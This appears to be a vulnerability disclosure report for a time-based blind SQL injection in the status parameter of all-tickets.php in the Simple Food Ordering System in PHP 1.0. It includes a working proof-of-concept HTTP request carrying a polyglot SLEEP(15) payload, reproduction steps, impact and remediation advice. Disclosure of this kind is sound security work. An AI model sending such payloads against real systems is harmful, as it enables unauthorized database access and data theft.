Vulnerability Report

## Title: 
Time-Based Blind SQL Injection in status Parameter of all-tickets.php
## Product: 
Simple Food Ordering System in PHP
## Vendor: 
Code-Projects
## Vendor URL: 
https://code-projects.org/simple-food-order-system-in-php-with-source-code/

## Affected Version: 1.0
Vulnerability Type: SQL Injection (Time-Based Blind)
CWE: CWE-89 – Improper Neutralization of Special Elements used in an SQL Command
Severity: High

## Description
A Time-Based Blind SQL Injection vulnerability exists in the Simple Food Ordering System in PHP 1.0 due to insufficient input validation in the status parameter of the all-tickets.php endpoint.

The application fails to properly sanitize user-supplied input before incorporating it into SQL queries. Because of this, an attacker can inject malicious SQL statements into the status parameter. By using time-delay functions such as SLEEP(), attackers can confirm the presence of SQL injection and interact with the database in a blind manner.

When a specially crafted payload is submitted to the vulnerable parameter, the backend database executes the injected SLEEP() function, causing the server to delay its response. This confirms that the injected SQL query is executed without proper filtering or parameterization.

An attacker may leverage this vulnerability to enumerate database structure, extract sensitive information, bypass authentication mechanisms, or manipulate database records.

## Affected Endpoint
/food/all-tickets.php

## Vulnerable parameter:

status
## Proof of Concept
```plain
The vulnerability can be triggered using the following HTTP request:

GET /food/all-tickets.php?status=orwa(select(0)from(select(sleep(15)))v)%2f%2a'%2B(select(0)from(select(sleep(15)))v)%2B'%22%2B(select(0)from(select(sleep(15)))v)%2B%22%2a%2f HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=d09ljmgtflh1l4dagc0opvshgr
Connection: keep-alive
```

## Steps to Reproduce

Deploy the Simple Food Ordering System application.

Log in or access the vulnerable endpoint if authentication is required.

Send the crafted HTTP request containing the SQL injection payload to the status parameter.

Observe the server response time.

## Result

The server response is delayed by approximately 15 seconds, confirming that the injected SLEEP(15) SQL command is executed by the database server.

This confirms the presence of a time-based blind SQL injection vulnerability.

## Impact

Successful exploitation may allow attackers to:

Extract sensitive information from the database

Enumerate database tables and columns

Retrieve administrator credentials

Bypass authentication mechanisms

Modify or delete database records

Potentially gain administrative access to the application

In severe cases, attackers could fully compromise the application database.

## Remediation

Developers should implement the following security measures:

Use Prepared Statements

Parameterized queries prevent SQL injection attacks.

Example:

$stmt = $pdo->prepare("SELECT * FROM tickets WHERE status = ?");
$stmt->execute([$status]);
Input Validation

Validate and sanitize all user-supplied input before processing it.

Least Privilege Principle

Ensure that the database user used by the application has minimal privileges.

Web Application Firewall

Deploy a WAF to detect and block SQL injection attempts.

Vulnerability Classification

CWE:

CWE-89 – SQL Injection

OWASP Top 10:

A03:2021 – Injection

## References

OWASP SQL Injection
https://owasp.org/www-community/attacks/SQL_Injection

CWE-89
https://cwe.mitre.org/data/definitions/89.html

Code-Projects Simple Food Ordering System
https://code-projects.org/simple-food-order-system-in-php-with-source-code/

<img width="1374" height="709" alt="Image" src="https://github.com/user-attachments/assets/6815731f-ca4f-407e-b441-0c456820e495" />
